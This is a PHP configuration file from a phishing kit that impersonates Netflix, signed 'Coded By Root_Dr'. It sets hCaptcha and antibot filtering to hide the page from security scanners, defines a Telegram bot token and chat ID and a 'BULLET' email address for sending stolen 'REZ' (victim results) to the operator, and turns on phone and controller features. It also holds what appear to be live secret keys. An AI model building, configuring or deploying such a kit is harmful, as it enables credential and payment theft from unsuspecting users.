<?php
/*
██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██║     ███████║██║     █████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝   
Coded By Root_Dr
DM:@Root_Dr
*/
session_start();
error_reporting(0);

// Hcaptcha https://www.hcaptcha.com/
define("HCAPTCHA", true); // true or false
define("SECRETKEY", 'ES_ef68c82d736e431ba862ce230c80fdd0'); // secretkey hcaptcha
define("SITEKEY", '36741375-7087-49b9-8b3d-b12f526ebe3c'); // site key hcaptcha

define("TESTMODE", false); // true or false
define("ANTIBOTPW_API", ''); // ANTIBOT.PW API

define("FLAG", '🎞️');
define("SCAM_NAME", 'NETFLIX');
define("WEBSITE", 'https://netflix.com/');

// SCAM LINK
define("PANEL", 'http://www.localhost/netflix24/');
// TELEGRAM BOT REZ CONFIG
define("TOKEN", '6824139329:AAGjdKUcpSIUKKxJOdpGSh3MSp4hoWuwn7E');
define("CHATID", '-1001613821074');

define("NOTIF", true); // true or false
define("NOTIF_CHATID", '-1001613821074');

// MAIL REZ CONFIG
define("BULLET", 'your@email.com');

define("PHONE", true); // true or false
define("CONTROLLER", true); // true or false
